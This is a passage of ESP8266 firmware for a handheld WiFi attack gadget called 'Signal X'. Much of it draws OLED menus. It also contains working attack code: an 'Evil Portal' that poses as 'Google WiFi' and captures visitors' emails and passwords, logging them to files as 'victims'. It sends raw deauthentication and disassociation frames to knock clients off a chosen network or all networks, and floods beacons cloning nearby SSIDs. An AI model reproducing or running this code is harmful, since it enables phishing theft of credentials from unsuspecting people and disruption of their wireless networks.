          fileName = fileName.substring(0, 17) + "...";
        }
        
        int yPos = 20 + ((i-startIdx) * 14);
        
        if (i == currentFileIndex) {
          display.fillRect(0, yPos - 1, 128, 12);
          display.setColor(BLACK);
        }
        display.drawString(2, yPos, fileName);
        display.setColor(WHITE);
      }

      if (lastSelectedFileIndex == currentFileIndex) {
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 52, "Press SELECT again to DELETE");
      }
    }

    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 62, "Hold SELECT to exit");
    
    display.display();
  }

  void displayDeleteConfirmation() {
    uint8_t displayBuffer[1024];
    display.display(); 
    displayBuffer[0] = '\0';

    display.setColor(BLACK);
    display.fillRect(14, 15, 100, 40);
    display.setColor(WHITE);
    display.drawRect(14, 15, 100, 40);
    
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 20, "File Deleted:");
    String fileName = currentFiles[currentFileIndex];
    if (fileName.length() > 16) {
      fileName = fileName.substring(0, 13) + "...";
    }
    display.drawString(64, 35, fileName);
    display.display();

    delay(1500);
    
    display.clear();
    display.display();
  }

  bool deleteSelectedFile() {
    String path;
    if (currentFileMenu == FILE_VIEWING_NETWORKS) {
      path = "/networks/" + currentFiles[currentFileIndex];
    } else {
      path = "/creds/" + currentFiles[currentFileIndex];
    }
    
    bool success = LittleFS.remove(path);
    
    if (success) {
      if (currentFileMenu == FILE_VIEWING_NETWORKS) {
        loadDirectoryFiles("/networks");
      } else {
        loadDirectoryFiles("/creds");
      }

      if (currentFileIndex >= totalFiles && totalFiles > 0) {
        currentFileIndex = totalFiles - 1;
      }
      
      displayDeleteConfirmation();
    }
    
    return success;
  }

void displayFilesMenu() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
      display.setColor(WHITE);
      display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "FILES");
    display.setColor(WHITE);

    display.setTextAlignment(TEXT_ALIGN_LEFT);

    FSInfo fs_info;
    LittleFS.info(fs_info);
    
    int usedKB = fs_info.usedBytes / 1024;
    int totalKB = fs_info.totalBytes / 1024;
    int freeKB = totalKB - usedKB;

    display.drawRect(2, 15, 124, 8);
    int usedWidth = map(usedKB, 0, totalKB, 0, 124);
    display.fillRect(2, 15, usedWidth, 8);

    display.drawString(2, 25, "Used: " + String(usedKB) + "KB");
    display.drawString(70, 25, "Free: " + String(freeKB) + "KB");

    if (currentFileMenu == FILE_NETWORKS) {
      display.fillRect(2, 38, 60, 20);
      display.setColor(BLACK);
    }
    display.drawRect(2, 38, 60, 20);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(32, 42, "Networks");
    display.setColor(WHITE);
    
    if (currentFileMenu == FILE_CREDS) {
      display.fillRect(66, 38, 60, 20);
      display.setColor(BLACK);
    }
    display.drawRect(66, 38, 60, 20);
    display.drawString(96, 42, "Credentials");
    display.setColor(WHITE);

    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 62, "Hold SELECT to exit");
    
    display.display();
  }

  void rainbowLED(int wait) {
    static uint16_t hue = 0;
    
    uint32_t rgbcolor = pixels.ColorHSV(hue);
    
    pixels.setPixelColor(0, rgbcolor);
    pixels.show();
    
    hue += 256;
    if (hue >= 65536) {
        hue = 0;
    }
    
    delay(wait);
}

void displayRandomFact() {
    const char* facts[] = {
        "WiFi operates on 2.4GHz and 5GHz bands",
        "WPA3 is the latest WiFi security protocol",
        "The first WiFi standard was 802.11b",
        "WiFi can reach speeds up to 9.6 Gbps (WiFi 6)",
        "Microwave ovens can interfere with WiFi",
        "The WiFi symbol is a registered trademark",
        "WiFi stands for Wireless Fidelity",
        "The first WiFi-enabled device was in 1997",
        "Channel 14 is only legal in Japan",
        "WiFi signals can travel through walls"
    };
    
    int factIndex = random(0, 10);
    String fact = facts[factIndex];
    
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    
    int maxWidth = 120;
    String line1 = "", line2 = "";
    String words[20];
    int wordCount = 0;
    
    int startPos = 0;
    int spacePos = fact.indexOf(' ');
    while (spacePos >= 0) {
        words[wordCount++] = fact.substring(startPos, spacePos);
        startPos = spacePos + 1;
        spacePos = fact.indexOf(' ', startPos);
    }
    words[wordCount++] = fact.substring(startPos);

    for (int i = 0; i < wordCount; i++) {
        if (display.getStringWidth(line1 + " " + words[i]) < maxWidth) {
            if (line1.length() > 0) line1 += " ";
            line1 += words[i];
        } else {
            if (line2.length() > 0) line2 += " ";
            line2 += words[i];
        }
    }
    
    display.drawString(64, 52, line1);
    if (line2.length() > 0) {
        display.drawString(64, 62, line2);
    }
}

void handleAPClone() {
    static unsigned long lastBeacon = 0;
    
    if(millis() - lastBeacon > 100) {
        for(int i = 0; i < networkCount; i++) {
            sendBeaconPacket(networks[i].ssid.c_str());
        }
        beaconPacketCount += networkCount;
        lastBeacon = millis();
    }
}

void drawMenu() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_LEFT);
    display.drawString(2, 1, "Signal X");

    int batteryPercentage = map(analogRead(A0), 0, 1024, 0, 100);
    display.drawRect(100, 1, 24, 10);
    display.fillRect(124, 3, 2, 6);
    
    int batteryWidth = map(batteryPercentage, 0, 100, 0, 22);
    if (batteryPercentage > 20) {
        display.fillRect(101, 2, batteryWidth, 8);
    } else {
        if ((millis() / 500) % 2 == 0) {
            display.fillRect(101, 2, batteryWidth, 8);
        }
    }
    
    display.setColor(WHITE);

    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.setFont(ArialMT_Plain_16);

    int boxWidth = display.getStringWidth(menuItems[currentMenuItem]) + 20;

    display.drawRect(64 - (boxWidth/2), 22, boxWidth, 24);
    
    display.drawString(64, 24, menuItems[currentMenuItem]);

    display.setFont(ArialMT_Plain_16);
    if (currentMenuItem > 0) {
        display.drawString(10, 24, "<");
    }
    if (currentMenuItem < MENU_ITEMS - 1) {
        display.drawString(118, 24, ">");
    }

    const int dotSpacing = 10;
    const int dotRadius = 3;
    const int totalWidth = (MENU_ITEMS * dotSpacing);
    int startX = 64 - (totalWidth / 2);
    
    for(int i = 0; i < MENU_ITEMS; i++) {
        if(i == currentMenuItem) {
            display.fillCircle(startX + (i * dotSpacing), 58, dotRadius);
        } else {
            display.drawCircle(startX + (i * dotSpacing), 58, dotRadius);
        }
    }
    
    display.display();
}

void handleRoot() {
    webServer.send(200, "text/html", loginHTML);
}

void handleCapture() {
    if (credsCount < MAX_CREDS) {
        capturedCreds[credsCount].email = webServer.arg("email");
        capturedCreds[credsCount].password = webServer.arg("password");
        capturedCreds[credsCount].ip = webServer.client().remoteIP().toString();
        capturedCreds[credsCount].deviceInfo = webServer.header("User-Agent");
        capturedCreds[credsCount].timestamp = String(millis() / 1000);
        credsCount++;

        String filename = "/creds/creds_" + String(millis()) + ".txt";
        File file = LittleFS.open(filename, "w");
        file.println("Email: " + capturedCreds[credsCount-1].email);
        file.println("Password: " + capturedCreds[credsCount-1].password);
        file.println("IP: " + capturedCreds[credsCount-1].ip);
        file.println("Device: " + capturedCreds[credsCount-1].deviceInfo);
        file.println("Time: " + capturedCreds[credsCount-1].timestamp);
        file.close();
    }
    webServer.sendHeader("Location", "https://accounts.google.com");
    webServer.send(302, "text/plain", "");
}

void displaySoundSetting() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
      display.setColor(WHITE);
      display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "SOUND");
    display.setColor(WHITE);
    
    display.drawString(64, 20, "Sound Effects:");

    display.drawRect(44, 35, 40, 20);
    if (settings.soundEnabled) {
      display.fillRect(64, 35, 20, 20);
      display.setColor(BLACK);
      display.drawString(74, 40, "ON");
      display.setColor(WHITE);
      display.drawString(54, 40, "OFF");
    } else {
      display.fillRect(44, 35, 20, 20);
      display.setColor(BLACK);
      display.drawString(54, 40, "OFF");
      display.setColor(WHITE);
      display.drawString(74, 40, "ON");
    }

    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 62, "Hold SELECT to exit");
    
    display.display();
  }

void startGooglePortal() {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("Google WiFi");
    
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    
    webServer.on("/", HTTP_GET, handleRoot);
    webServer.on("/capture", HTTP_POST, handleCapture);
    webServer.onNotFound(handleRoot);
    webServer.begin();
}

void displayPortalRunning() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "EVIL PORTAL ACTIVE");
    display.setColor(WHITE);

    display.setTextAlignment(TEXT_ALIGN_LEFT);
    display.drawString(0, 15, "SSID:");
    display.drawString(40, 15, "Google WiFi");
    
    display.drawString(0, 27, "IP:");
    display.drawString(40, 27, WiFi.softAPIP().toString());
    
    display.drawString(0, 39, "Victims:");
    display.drawString(40, 39, String(credsCount));

    if (credsCount == 0) {
        int dots = (millis() / 500) % 4;
        String waiting = "Waiting";
        for (int i = 0; i < dots; i++) {
            waiting += ".";
        }
        display.drawString(0, 51, waiting);
    } else {
        display.drawString(0, 51, "Last victim: " + capturedCreds[credsCount-1].ip);
    }

    int clients = WiFi.softAPgetStationNum();
    display.setTextAlignment(TEXT_ALIGN_RIGHT);
    display.drawString(128, 51, String(clients) + " connected");
    
    display.display();
}

void displayCredentials() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "CAPTURED CREDENTIALS");
    display.setColor(WHITE);
    
    if (credsCount == 0) {
        display.drawString(64, 32, "No victims yet");
    } else {
        int currentPage = currentNetwork / 2;
        int startIdx = currentPage * 2;
        int itemsToShow = min(2, credsCount - startIdx);
        
        for(int i = 0; i < itemsToShow; i++) {
            int idx = startIdx + i;
            int yPos = i * 32 + 14;

            display.drawRect(0, yPos, 128, 30);
            
            display.setTextAlignment(TEXT_ALIGN_LEFT);
            display.drawString(2, yPos + 2, "Victim " + String(idx + 1) + ":");
            display.drawString(2, yPos + 12, capturedCreds[idx].email);

            String maskedPwd = "";
            for (int j = 0; j < capturedCreds[idx].password.length(); j++) {
                maskedPwd += "*";
            }
            display.drawString(2, yPos + 22, "Pwd: " + maskedPwd);
            
            display.setTextAlignment(TEXT_ALIGN_RIGHT);
            display.drawString(126, yPos + 2, capturedCreds[idx].ip);
        }

        int totalPages = (credsCount + 1) / 2;
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 54, "Page " + String(currentPage + 1) + "/" + String(totalPages));
    }
    
    display.display();
}

void performWiFiScan() {
    const int SCAN_DURATION = 5000;
    unsigned long scanStartTime = millis();
    int foundNetworks = 0;
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    WiFi.scanNetworksAsync([](int networksFound){}, true);
    
    while (millis() - scanStartTime < SCAN_DURATION) {
        display.clear();
        display.setFont(ArialMT_Plain_10);

        for (int i = 0; i < 12; i++) {
            display.setColor(WHITE);
            display.drawHorizontalLine(0, i, 128);
        }
        
        display.setColor(BLACK);
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 1, "SCANNING NETWORKS");
        display.setColor(WHITE);

        int radius = ((millis() - scanStartTime) / 100) % 30;
        display.drawCircle(64, 32, radius);
        display.drawCircle(64, 32, radius - 10 > 0 ? radius - 10 : 0);
        display.drawCircle(64, 32, radius - 20 > 0 ? radius - 20 : 0);

        float angle = ((millis() - scanStartTime) / 50) % 360;
        float radians = angle * 3.14159 / 180.0;
        int lineEndX = 64 + cos(radians) * 30;
        int lineEndY = 32 + sin(radians) * 30;
        display.drawLine(64, 32, lineEndX, lineEndY);
        
        foundNetworks = WiFi.scanComplete();
        if (foundNetworks > 0) {
            display.setFont(ArialMT_Plain_10);
            String networkText = String(foundNetworks) + " Networks Found";
            display.drawString(64, 42, networkText);
        }
        
        int progress = ((millis() - scanStartTime) * 100) / SCAN_DURATION;
        int barWidth = (progress * 100) / 100;
        display.drawRect(14, 54, 100, 8);
        display.fillRect(14, 54, barWidth, 8);
        
        display.display();
        delay(50);
    }
    
    networkCount = WiFi.scanComplete();
    if (networkCount > MAX_NETWORKS) networkCount = MAX_NETWORKS;
    
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        if (networks[i].ssid.length() == 0) {
            networks[i].ssid = "Hidden Network";
        }
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].encType = WiFi.encryptionType(i);
        networks[i].mac = WiFi.BSSIDstr(i);
        networks[i].channel = WiFi.channel(i);
    }
}

void performDeauth(const char* target_mac) {
  uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
  };
  uint8_t disassocPacket[26];

    sscanf(target_mac, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
        &deauthPacket[10], &deauthPacket[11], &deauthPacket[12],
        &deauthPacket[13], &deauthPacket[14], &deauthPacket[15]);
 
    memcpy(&deauthPacket[16], &deauthPacket[10], 6);
    memcpy(disassocPacket, deauthPacket, sizeof(deauthPacket));

    wifi_set_channel(networks[currentNetwork].channel);
    
    for(int i = 0; i < 4; i++) {
        wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
        delayMicroseconds(50);
        wifi_send_pkt_freedom(disassocPacket, sizeof(disassocPacket), 0);
        delayMicroseconds(50);
    }
    
    packetsCount += 8;
}

void displayDeauthList() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "SELECT TARGET");
    display.setColor(WHITE);
    
    int startIdx = (currentNetwork / 4) * 4;
    int itemsToShow = min(4, networkCount + 1 - startIdx);
    
    for(int i = 0; i < itemsToShow; i++) {
        int actualIdx = startIdx + i;
        String itemText;
        
        if(actualIdx < networkCount) {
            itemText = networks[actualIdx].ssid;
            if(itemText.length() > 16) {
                itemText = itemText.substring(0, 14) + "..";
            }
        } else {
            itemText = "DEAUTH ALL";
        }

        if(actualIdx == currentNetwork) {
            display.fillRect(0, 14 + (i * 12), 128, 11);
            display.setColor(BLACK);
        }

        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 14 + (i * 12), itemText);
        display.setColor(WHITE);
    }
    
    display.display();
}

void performWiFiLocation() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "WIFI LOCATION");
    display.setColor(WHITE);

    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 15, "Scanning networks...");
    display.display();

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    int networksFound = WiFi.scanNetworks();
    
    if (networksFound == 0) {
        display.clear();
        display.setFont(ArialMT_Plain_10);
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 32, "No networks found");
        display.display();
        delay(2000);
        return;
    }

    int selectedNetwork = -1;
    int bestSignal = -100;
    
    for (int i = 0; i < networksFound; i++) {
        if (WiFi.encryptionType(i) == ENC_TYPE_NONE && WiFi.RSSI(i) > bestSignal) {
            selectedNetwork = i;
            bestSignal = WiFi.RSSI(i);
        }
    }

    if (selectedNetwork == -1) {
        display.clear();
        display.setFont(ArialMT_Plain_10);
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 32, "No open networks found");
        display.display();
        delay(2000);
        return;
    }

    display.clear();
    display.setFont(ArialMT_Plain_10);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 15, "Connecting to:");
    display.drawString(64, 30, WiFi.SSID(selectedNetwork));
    display.display();

    WiFi.begin(WiFi.SSID(selectedNetwork).c_str());

    int timeout = 0;
    while (WiFi.status() != WL_CONNECTED && timeout < 20) {
        delay(500);
        timeout++;

        String dots = "";
        for (int i = 0; i < timeout % 4; i++) {
            dots += ".";
        }
        display.drawString(64, 45, "Connecting" + dots);
        display.display();
    }

    if (WiFi.status() != WL_CONNECTED) {
        display.clear();
        display.setFont(ArialMT_Plain_10);
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 32, "Connection failed");
        display.display();
        delay(2000);
        return;
    }

    IPAddress localIP = WiFi.localIP();
    IPAddress gatewayIP = WiFi.gatewayIP();

    WiFiClient client;
    locationRequestTime = millis();
    locationFound = false;
    
    display.clear();
    display.setFont(ArialMT_Plain_10);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 15, "Getting location...");
    display.display();

    if (client.connect("ip-api.com", 80)) {
        client.println("GET /json HTTP/1.1");
        client.println("Host: ip-api.com");
        client.println("Connection: close");
        client.println();

        unsigned long timeout = millis();
        while (client.available() == 0) {
            if (millis() - timeout > 5000) {
                client.stop();
                display.clear();
                display.setFont(ArialMT_Plain_10);
                display.setTextAlignment(TEXT_ALIGN_CENTER);
                display.drawString(64, 32, "Request timeout");
                display.display();
                delay(2000);
                return;
            }

            int dots = ((millis() - timeout) / 500) % 4;
            display.clear();
            display.setFont(ArialMT_Plain_10);
            display.setTextAlignment(TEXT_ALIGN_CENTER);
            display.drawString(64, 15, "Getting location");
            String dotsStr = "";
            for (int i = 0; i < dots; i++) dotsStr += ".";
            display.drawString(64, 30, dotsStr);
            display.display();
        }

        String line = client.readStringUntil('\r');
        while (line.length() > 0) {
            line = client.readStringUntil('\r');
        }

        DynamicJsonDocument doc(1024);
        DeserializationError error = deserializeJson(doc, client);
        
        if (!error && doc.containsKey("country") && doc.containsKey("regionName") && doc.containsKey("city")) {
            String country = doc["country"].as<String>();
            String region = doc["regionName"].as<String>();
            String city = doc["city"].as<String>();
            String isp = doc["isp"].as<String>();
            
            locationInfo = city + ", " + region + "\n" + country;
            locationFound = true;
        } else {
            locationInfo = "Location data unavailable";
        }
        
        client.stop();
    } else {
        locationInfo = "Failed to connect to location service";
    }

    WiFi.disconnect();
}

void displayWiFiLocation() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "WIFI LOCATION");
    display.setColor(WHITE);

    if (locationFound) {
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 15, "Current Location:");

        int newlinePos = locationInfo.indexOf('\n');
        if (newlinePos > 0) {
            String cityRegion = locationInfo.substring(0, newlinePos);
            String country = locationInfo.substring(newlinePos + 1);
            
            display.drawString(64, 30, cityRegion);
            display.drawString(64, 45, country);
        } else {
            display.drawString(64, 30, locationInfo);
        }

        unsigned long elapsedSeconds = (millis() - locationRequestTime) / 1000;
        display.setTextAlignment(TEXT_ALIGN_RIGHT);
        display.drawString(124, 54, String(elapsedSeconds) + "s ago");
    } else {
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 32, locationInfo);
    }
    
    display.display();
}

void displayDeauthInfo() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "DEAUTH ATTACK");
    display.setColor(WHITE);
    
    display.setTextAlignment(TEXT_ALIGN_LEFT);

    display.drawString(0, 15, "Target:");
    String targetName = currentTarget;
    if (targetName.length() > 16) {
        targetName = targetName.substring(0, 14) + "..";
    }
    display.drawString(40, 15, targetName);

    int animFrame = (millis() / 200) % 3;
    for (int i = 0; i < 3; i++) {
        if (i == animFrame) {
            display.fillTriangle(
                120 - i*5, 15,
                128 - i*5, 19,
                120 - i*5, 23
            );
        }
    }
    
    lastDuration = (millis() - attackStartTime) / 1000;
    String timeStr = String(lastDuration) + "s";
    display.drawString(0, 27, "Duration: " + timeStr);
    
    lastPacketCount = packetsCount;
    display.drawString(0, 39, "Packets: " + String(lastPacketCount));

    display.drawString(0, 51, "Channel: " + String(networks[currentNetwork].channel));

    int signalStrength = map(networks[currentNetwork].rssi, -90, -30, 1, 5);
    for (int i = 0; i < 5; i++) {
        int barHeight = 2 + (i * 2);
        int barX = 90 + (i * 6);
        if (i < signalStrength) {
            display.fillRect(barX, 53 - barHeight, 4, barHeight);
        } else {
            display.drawRect(barX, 53 - barHeight, 4, barHeight);
        }
    }
    
    display.display();
}

void displayPortalMenu() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "EVIL PORTAL");
    display.setColor(WHITE);

    for (int i = 0; i < PORTAL_ITEMS; i++) {
        display.drawRect(14 + 3, 14 + (i * 16), 100 - 6, 14); 
        display.drawRect(14, 14 + (i * 16) + 3, 100, 14 - 6);
        display.drawCircle(14 + 3, 14 + (i * 16) + 3, 3);  
        display.drawCircle(14 + 100 - 3, 14 + (i * 16) + 3, 3); 
        display.drawCircle(14 + 3, 14 + (i * 16) + 14 - 3, 3); 
        display.drawCircle(14 + 100 - 3, 14 + (i * 16) + 14 - 3, 3); 
        
        if (i == currentPortalItem) {
            display.fillRect(14 + 3, 14 + (i * 16), 100 - 6, 14); 
            display.fillCircle(14 + 3, 14 + (i * 16) + 3, 3);  
            display.fillCircle(14 + 100 - 3, 14 + (i * 16) + 3, 3);
            display.fillCircle(14 + 3, 14 + (i * 16) + 14 - 3, 3);
            display.fillCircle(14 + 100 - 3, 14 + (i * 16) + 14 - 3, 3);
            display.setColor(BLACK);
        }
        display.drawString(64, 16 + (i * 16), portalItems[i]);
        display.setColor(WHITE);

        switch(i) {
            case 0:
                display.drawRect(20, 16 + (i * 16), 10, 10);
                display.drawLine(20, 16 + (i * 16), 30, 26 + (i * 16));
                display.drawLine(30, 16 + (i * 16), 20, 26 + (i * 16));
                break;
            case 1:
                display.drawLine(20, 21 + (i * 16), 25, 16 + (i * 16));
                display.drawLine(25, 16 + (i * 16), 30, 21 + (i * 16));
                display.drawLine(20, 21 + (i * 16), 30, 21 + (i * 16));
                break;
            case 2:
                display.drawCircle(25, 21 + (i * 16), 5);
                display.drawLine(25, 16 + (i * 16), 28, 13 + (i * 16));
                break;
        }
    }

    display.display();
}

void displayPacketMonitor() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "PACKET MONITOR");
    display.setColor(WHITE);
    
    display.drawVerticalLine(85, 12, 52);

    for(int i = 0; i < 84; i++) {
        int x = i;
        int height = map(packetHistory[(historyIndex + i) % 128], 0, 50, 0, 45);
        if(height > 0) {
            int lineWidth = map(height, 0, 45, 1, 3);
            for(int w = 0; w < lineWidth; w++) {
                display.drawVerticalLine(x, 64 - height, height);
            }
        }
    }
    
    display.setTextAlignment(TEXT_ALIGN_LEFT);

    display.drawString(88, 15, "CH: " + String(currentChannel));
    display.fillTriangle(120, 15, 125, 10, 130, 15);
    display.fillTriangle(120, 20, 125, 25, 130, 20);

    display.drawString(88, 27, "Pkt/s: " + String(packetsPerSecond));
    
    display.drawString(88, 39, "Tot: " + String(lastPacketCount));

    display.drawString(88, 51, "dB: " + String(WiFi.RSSI()));
    int signalStrength = map(WiFi.RSSI(), -90, -30, 1, 5);
    for (int i = 0; i < 5; i++) {
        int barHeight = 2 + (i * 2);
        if (i < signalStrength) {
            display.fillRect(110 + (i * 4), 53 - barHeight, 3, barHeight);
        } else {
            display.drawRect(110 + (i * 4), 53 - barHeight, 3, barHeight);
        }
    }
    
    display.display();
}

void handleDeauthAttack() {
  if(!attackStartTime) {
      attackStartTime = millis();
      packetsCount = 0;
  }
  
  if(currentNetwork == networkCount) {
      currentTarget = "ALL NETWORKS";
      for(int i = 0; i < networkCount; i++) {
          currentNetwork = i;
          performDeauth(networks[i].mac.c_str());
      }
  } else {
      currentTarget = networks[currentNetwork].ssid;
      performDeauth(networks[currentNetwork].mac.c_str());
  }
}

String getWiFiBand(int channel) {
  if (channel >= 1 && channel <= 14) {
      return "2.4 GHz";
  } else {
      return "5 GHz";
  }
}

void displayNetworkInfo() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
      display.setColor(WHITE);
      display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_LEFT);
    display.drawString(2, 1, String(networkCount) + " Networks");
    display.setTextAlignment(TEXT_ALIGN_RIGHT);
    display.drawString(126, 1, String(currentNetwork + 1) + "/" + String(networkCount));
    display.setColor(WHITE);
  
    if (networkCount > 0) {
        display.drawRect(0, 14, 128, 14);
        String ssidTruncated = networks[currentNetwork].ssid;
        if (ssidTruncated.length() > 16) {
            ssidTruncated = ssidTruncated.substring(0, 14) + "..";
        }
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 16, ssidTruncated);

        display.setTextAlignment(TEXT_ALIGN_LEFT);
        display.drawString(2, 32, "Signal:");
        display.drawString(2, 44, "Security:");

        display.setTextAlignment(TEXT_ALIGN_LEFT);
        display.drawString(50, 32, String(networks[currentNetwork].rssi) + " dB");
        display.drawString(50, 44, getEncryptionType(networks[currentNetwork].encType));

        int signalStrength = map(networks[currentNetwork].rssi, -90, -30, 1, 4);
        for (int i = 0; i < 4; i++) {
            int barHeight = 3 + (i * 2);
            int barX = 110 + (i * 4);
            if (i < signalStrength) {
                display.fillRect(barX, 35 - barHeight, 3, barHeight);
            } else {
                display.drawRect(barX, 35 - barHeight, 3, barHeight);
            }
        }

        display.setTextAlignment(TEXT_ALIGN_LEFT);
        display.drawString(2, 54, "Ch: " + String(networks[currentNetwork].channel));
        
        display.setTextAlignment(TEXT_ALIGN_CENTER);
        display.drawString(64, 54, getWiFiBand(networks[currentNetwork].channel));

        display.setTextAlignment(TEXT_ALIGN_RIGHT);
        String macShort = networks[currentNetwork].mac.substring(networks[currentNetwork].mac.length() - 8);
        display.drawString(126, 54, macShort);
    }
    
    display.display();
  }  

  void displaySettingsMenu() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
      display.setColor(WHITE);
      display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "SETTINGS");
    display.setColor(WHITE);

    const char* settingsItems[] = {
      "Brightness",
      "Auto Scan",
      "Scan Interval",
      "Sound",
      "LED Feedback",
      "Save Settings",
      "About",
      "Back"
    };
    const int SETTINGS_ITEMS = 8;
    
    int startIdx = (currentSettingsItem / 5) * 5;
    int endIdx = min(startIdx + 5, SETTINGS_ITEMS);
    
    for (int i = startIdx; i < endIdx; i++) {
      int yPos = 14 + ((i - startIdx) * 10);
      
      if (i == currentSettingsItem) {
        display.fillRect(0, yPos - 1, 128, 11);
        display.setColor(BLACK);
      }
      
      display.setTextAlignment(TEXT_ALIGN_CENTER);
      display.drawString(64, yPos, settingsItems[i]);
      display.setColor(WHITE);
    }
    
    display.display();
}

void displayBrightnessSetting() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "BRIGHTNESS");
    display.setColor(WHITE);

    display.drawRect(14, 30, 100, 10);
    int sliderPos = map(currentBrightness, MIN_BRIGHTNESS, MAX_BRIGHTNESS, 0, 100);
    display.fillRect(14, 30, sliderPos, 10);

    display.fillRect(14 + sliderPos - 2, 28, 4, 14);

    int percentage = map(currentBrightness, MIN_BRIGHTNESS, MAX_BRIGHTNESS, 0, 100);
    display.drawString(64, 45, String(percentage) + "%");
    
    display.display();

    display.setContrast(currentBrightness);
}

void displayAutoScanSetting() {
    display.clear();
    display.setFont(ArialMT_Plain_10);

    for (int i = 0; i < 12; i++) {
        display.setColor(WHITE);
        display.drawHorizontalLine(0, i, 128);
    }
    
    display.setColor(BLACK);
    display.setTextAlignment(TEXT_ALIGN_CENTER);
    display.drawString(64, 1, "AUTO SCAN");
    display.setColor(WHITE);
    
